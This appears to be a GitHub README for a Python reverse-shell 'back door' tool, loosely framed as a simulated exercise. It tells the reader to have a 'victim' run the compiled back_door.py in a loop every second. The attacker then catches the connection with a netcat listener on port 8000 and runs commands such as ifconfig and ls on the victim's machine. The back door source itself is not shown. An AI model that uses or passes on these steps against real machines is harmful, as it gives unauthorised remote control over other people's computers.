
#Python Back Door(Hacking) script


![N|Solid](https://avatars2.githubusercontent.com/u/1525981?v=3&s=200)  ![N|Solid](https://www.doubleglazingontheweb.co.uk/wp-content/uploads/2015/11/white-upvc-back-door-250x250.jpg) 




###This is really simple Python hacking code. 

###easy to saying, you can use the Python built-in function to open the back-door on your opponent's(victims) computer.


But it's a simulated hacking exercise,
Assuming that the victim executes the python script that was compiled.
The first thing we do is start to think about it.

###We will use a great open source tool called  "NetCat"
http://netcat.sourceforge.net/

##If you are a user of OSX, you can download it easily. by 

```sh
$ brew install netcat
```
##Or if you are a linux user

```sh
$ apt-get install netcat
```

##Right now you can run in your own backyard or anywhere 


```sh
**********************victim's computer or shell***********************
$ ##lets compile###
$ python -m compileall back_door.py    
-------------------------------------------------------

this is shell bash script 
which mean , run this script every 1 sec..!
-----------------------------------------------
$ while true; do python back_door.pyc; sleep 1; done


```


##Open another shell try this netcat command
```sh
$ netcat -l -p 8000 
```

you can 
```sh
$ ifconfig 
```
![N|Solid](https://github.com/elastic7327/backdoor_tool/blob/master/picture/do%20ifconfig.png)


you can also do 
```sh
$ ls -al 
```
![N|Solid](https://github.com/elastic7327/backdoor_tool/blob/master/picture/do%20ls%20-al.png)


##and you can do what ever you want!!! except for sudo command!


